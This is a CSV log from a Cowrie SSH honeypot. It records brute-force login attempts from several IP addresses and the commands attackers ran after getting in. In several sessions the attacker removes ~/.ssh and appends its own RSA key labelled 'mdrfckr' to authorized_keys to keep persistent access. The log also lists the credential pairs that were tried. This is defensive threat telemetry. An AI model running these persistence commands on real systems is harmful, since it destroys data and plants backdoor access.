eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.version,4.197.106.54,,,,1eff31007e9e,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:09:51.146523Z
cowrie.client.kex,4.197.106.54,,,,1eff31007e9e,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:09:51.285691Z
cowrie.login.success,4.197.106.54,,,,1eff31007e9e,,,,,login attempt [root/ertyuiop] succeeded,localhost,2024-12-01T01:09:51.886412Z
cowrie.session.params,4.197.106.54,,,,1eff31007e9e,,,,,[],localhost,2024-12-01T01:09:52.179135Z
cowrie.command.input,4.197.106.54,,,,1eff31007e9e,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-12-01T01:09:52.179504Z
cowrie.command.failed,4.197.106.54,,,,1eff31007e9e,,,,,Command not found: lockr -ia .ssh,localhost,2024-12-01T01:09:52.180150Z
cowrie.log.closed,4.197.106.54,,,,1eff31007e9e,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-12-01T01:09:52.499092Z
cowrie.session.params,4.197.106.54,,,,1eff31007e9e,,,,,[],localhost,2024-12-01T01:09:52.655453Z
cowrie.command.input,4.197.106.54,,,,1eff31007e9e,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-12-01T01:09:52.655799Z
cowrie.session.file_download,4.197.106.54,,,,1eff31007e9e,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-12-01T01:09:52.796632Z
cowrie.log.closed,4.197.106.54,,,,1eff31007e9e,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-12-01T01:09:52.797114Z
cowrie.session.connect,4.197.106.54,41206,172.233.154.19,2222,a538e4f320ff,ssh,,,,New connection: 4.197.106.54:41206 (172.233.154.19:2222) [session: a538e4f320ff],localhost,2024-12-01T01:09:52.935632Z
cowrie.client.version,4.197.106.54,,,,a538e4f320ff,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:09:52.936377Z
cowrie.client.kex,4.197.106.54,,,,a538e4f320ff,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:09:53.075484Z
cowrie.login.failed,4.197.106.54,,,,a538e4f320ff,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-12-01T01:09:53.672931Z
cowrie.session.closed,4.197.106.54,,,,a538e4f320ff,,,,,Connection lost after 1 seconds,localhost,2024-12-01T01:09:54.814277Z
cowrie.session.connect,181.1.152.226,58446,172.233.154.19,2222,34d5b6a7ad1e,ssh,,,,New connection: 181.1.152.226:58446 (172.233.154.19:2222) [session: 34d5b6a7ad1e],localhost,2024-12-01T01:09:54.827695Z
cowrie.client.version,181.1.152.226,,,,34d5b6a7ad1e,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:09:54.828223Z
cowrie.session.connect,4.197.106.54,41222,172.233.154.19,2222,4fd2244f41c0,ssh,,,,New connection: 4.197.106.54:41222 (172.233.154.19:2222) [session: 4fd2244f41c0],localhost,2024-12-01T01:09:54.954258Z
cowrie.client.version,4.197.106.54,,,,4fd2244f41c0,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:09:54.954779Z
cowrie.client.kex,181.1.152.226,,,,34d5b6a7ad1e,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:09:54.977545Z
cowrie.client.kex,4.197.106.54,,,,4fd2244f41c0,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:09:55.094486Z
cowrie.login.failed,181.1.152.226,,,,34d5b6a7ad1e,,,,,login attempt [lum/lum] failed,localhost,2024-12-01T01:09:55.614555Z
cowrie.login.success,4.197.106.54,,,,4fd2244f41c0,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-12-01T01:09:55.694780Z
cowrie.session.closed,4.197.106.54,,,,1eff31007e9e,,,,,Connection lost after 4 seconds,localhost,2024-12-01T01:09:55.835773Z
cowrie.session.closed,4.197.106.54,,,,4fd2244f41c0,,,,,Connection lost after 0 seconds,localhost,2024-12-01T01:09:55.836545Z
cowrie.session.closed,181.1.152.226,,,,34d5b6a7ad1e,,,,,Connection lost after 1 seconds,localhost,2024-12-01T01:09:56.766618Z
cowrie.session.connect,98.97.135.131,50708,172.233.154.19,2222,ae504aaf3c8d,ssh,,,,New connection: 98.97.135.131:50708 (172.233.154.19:2222) [session: ae504aaf3c8d],localhost,2024-12-01T01:10:54.430269Z
cowrie.client.version,98.97.135.131,,,,ae504aaf3c8d,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:10:54.437475Z
cowrie.client.kex,98.97.135.131,,,,ae504aaf3c8d,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:10:54.637639Z
cowrie.login.failed,98.97.135.131,,,,ae504aaf3c8d,,,,,login attempt [en/en] failed,localhost,2024-12-01T01:10:55.438303Z
cowrie.session.connect,14.103.127.83,56774,172.233.154.19,2222,19fca7c6228f,ssh,,,,New connection: 14.103.127.83:56774 (172.233.154.19:2222) [session: 19fca7c6228f],localhost,2024-12-01T01:10:55.874665Z
cowrie.client.version,14.103.127.83,,,,19fca7c6228f,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:10:55.882545Z
cowrie.session.closed,98.97.135.131,,,,ae504aaf3c8d,,,,,Connection lost after 2 seconds,localhost,2024-12-01T01:10:56.638550Z
cowrie.client.kex,14.103.127.83,,,,19fca7c6228f,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:10:56.991377Z
cowrie.session.closed,14.103.127.83,,,,19fca7c6228f,,,,,Connection lost after 4 seconds,localhost,2024-12-01T01:11:00.715193Z
cowrie.session.connect,4.197.106.54,48480,172.233.154.19,2222,e962bf4b4ff6,ssh,,,,New connection: 4.197.106.54:48480 (172.233.154.19:2222) [session: e962bf4b4ff6],localhost,2024-12-01T01:11:30.597544Z
cowrie.client.version,4.197.106.54,,,,e962bf4b4ff6,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:11:30.598844Z
cowrie.client.kex,4.197.106.54,,,,e962bf4b4ff6,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:11:30.738177Z
cowrie.login.success,4.197.106.54,,,,e962bf4b4ff6,,,,,login attempt [root/ertyuiop] succeeded,localhost,2024-12-01T01:11:31.336399Z
cowrie.session.params,4.197.106.54,,,,e962bf4b4ff6,,,,,[],localhost,2024-12-01T01:11:31.628500Z
cowrie.command.input,4.197.106.54,,,,e962bf4b4ff6,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-12-01T01:11:31.628849Z
cowrie.command.failed,4.197.106.54,,,,e962bf4b4ff6,,,,,Command not found: lockr -ia .ssh,localhost,2024-12-01T01:11:31.629498Z
cowrie.log.closed,4.197.106.54,,,,e962bf4b4ff6,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-12-01T01:11:31.949241Z
cowrie.session.params,4.197.106.54,,,,e962bf4b4ff6,,,,,[],localhost,2024-12-01T01:11:32.106832Z
cowrie.command.input,4.197.106.54,,,,e962bf4b4ff6,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-12-01T01:11:32.107237Z
cowrie.session.file_download,4.197.106.54,,,,e962bf4b4ff6,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-12-01T01:11:32.248247Z
cowrie.log.closed,4.197.106.54,,,,e962bf4b4ff6,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-12-01T01:11:32.248703Z
cowrie.session.connect,4.197.106.54,48488,172.233.154.19,2222,77f1301c36f9,ssh,,,,New connection: 4.197.106.54:48488 (172.233.154.19:2222) [session: 77f1301c36f9],localhost,2024-12-01T01:11:32.392416Z
cowrie.client.version,4.197.106.54,,,,77f1301c36f9,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:11:32.393075Z
cowrie.client.kex,4.197.106.54,,,,77f1301c36f9,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:11:32.535154Z
cowrie.login.failed,4.197.106.54,,,,77f1301c36f9,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-12-01T01:11:33.144425Z
cowrie.session.closed,4.197.106.54,,,,77f1301c36f9,,,,,Connection lost after 1 seconds,localhost,2024-12-01T01:11:34.288481Z
cowrie.session.connect,4.197.106.54,48490,172.233.154.19,2222,0ad5d59956ba,ssh,,,,New connection: 4.197.106.54:48490 (172.233.154.19:2222) [session: 0ad5d59956ba],localhost,2024-12-01T01:11:34.425279Z
cowrie.client.version,4.197.106.54,,,,0ad5d59956ba,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:11:34.425778Z
cowrie.client.kex,4.197.106.54,,,,0ad5d59956ba,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:11:34.570535Z
cowrie.login.success,4.197.106.54,,,,0ad5d59956ba,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-12-01T01:11:35.170175Z
cowrie.session.closed,4.197.106.54,,,,e962bf4b4ff6,,,,,Connection lost after 4 seconds,localhost,2024-12-01T01:11:35.310883Z
cowrie.session.closed,4.197.106.54,,,,0ad5d59956ba,,,,,Connection lost after 0 seconds,localhost,2024-12-01T01:11:35.311419Z
cowrie.session.connect,181.1.152.226,56520,172.233.154.19,2222,502aa95c80fd,ssh,,,,New connection: 181.1.152.226:56520 (172.233.154.19:2222) [session: 502aa95c80fd],localhost,2024-12-01T01:11:54.073053Z
cowrie.client.version,181.1.152.226,,,,502aa95c80fd,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:11:54.073599Z
cowrie.client.kex,181.1.152.226,,,,502aa95c80fd,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:11:54.229891Z
cowrie.login.failed,181.1.152.226,,,,502aa95c80fd,,,,,login attempt [sanae/sanae] failed,localhost,2024-12-01T01:11:54.892573Z
cowrie.session.closed,181.1.152.226,,,,502aa95c80fd,,,,,Connection lost after 2 seconds,localhost,2024-12-01T01:11:56.100007Z
cowrie.session.connect,51.15.225.134,36018,172.233.154.19,2222,66f80e5ca496,ssh,,,,New connection: 51.15.225.134:36018 (172.233.154.19:2222) [session: 66f80e5ca496],localhost,2024-12-01T01:12:07.515559Z
cowrie.client.version,51.15.225.134,,,,66f80e5ca496,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:12:07.517968Z
cowrie.client.kex,51.15.225.134,,,,66f80e5ca496,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:12:07.651450Z
cowrie.login.success,51.15.225.134,,,,66f80e5ca496,,,,,login attempt [root/root888888] succeeded,localhost,2024-12-01T01:12:08.196040Z
cowrie.session.params,51.15.225.134,,,,66f80e5ca496,,,,,[],localhost,2024-12-01T01:12:08.491912Z
cowrie.command.input,51.15.225.134,,,,66f80e5ca496,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-12-01T01:12:08.492300Z
cowrie.command.failed,51.15.225.134,,,,66f80e5ca496,,,,,Command not found: lockr -ia .ssh,localhost,2024-12-01T01:12:08.493023Z
cowrie.log.closed,51.15.225.134,,,,66f80e5ca496,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-12-01T01:12:08.808036Z
cowrie.session.params,51.15.225.134,,,,66f80e5ca496,,,,,[],localhost,2024-12-01T01:12:08.964454Z
cowrie.command.input,51.15.225.134,,,,66f80e5ca496,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-12-01T01:12:08.964839Z
cowrie.session.file_download,51.15.225.134,,,,66f80e5ca496,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-12-01T01:12:09.104759Z
cowrie.log.closed,51.15.225.134,,,,66f80e5ca496,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-12-01T01:12:09.105282Z
cowrie.session.connect,51.15.225.134,36302,172.233.154.19,2222,20cf30ba8c53,ssh,,,,New connection: 51.15.225.134:36302 (172.233.154.19:2222) [session: 20cf30ba8c53],localhost,2024-12-01T01:12:09.243554Z
cowrie.client.version,51.15.225.134,,,,20cf30ba8c53,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:12:09.246445Z
cowrie.client.kex,51.15.225.134,,,,20cf30ba8c53,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:12:09.384241Z
cowrie.login.failed,51.15.225.134,,,,20cf30ba8c53,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-12-01T01:12:09.941083Z
cowrie.session.closed,51.15.225.134,,,,20cf30ba8c53,,,,,Connection lost after 1 seconds,localhost,2024-12-01T01:12:11.082019Z
cowrie.session.connect,51.15.225.134,36666,172.233.154.19,2222,76f7b1af13f3,ssh,,,,New connection: 51.15.225.134:36666 (172.233.154.19:2222) [session: 76f7b1af13f3],localhost,2024-12-01T01:12:11.219768Z
cowrie.client.version,51.15.225.134,,,,76f7b1af13f3,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:12:11.220542Z
cowrie.client.kex,51.15.225.134,,,,76f7b1af13f3,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:12:11.363231Z
cowrie.login.success,51.15.225.134,,,,76f7b1af13f3,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-12-01T01:12:11.963900Z
cowrie.session.closed,51.15.225.134,,,,66f80e5ca496,,,,,Connection lost after 4 seconds,localhost,2024-12-01T01:12:12.108026Z
cowrie.session.closed,51.15.225.134,,,,76f7b1af13f3,,,,,Connection lost after 0 seconds,localhost,2024-12-01T01:12:12.108504Z
cowrie.session.connect,139.199.80.137,56648,172.233.154.19,2222,cd0a92f36c4c,ssh,,,,New connection: 139.199.80.137:56648 (172.233.154.19:2222) [session: cd0a92f36c4c],localhost,2024-12-01T01:12:24.509152Z
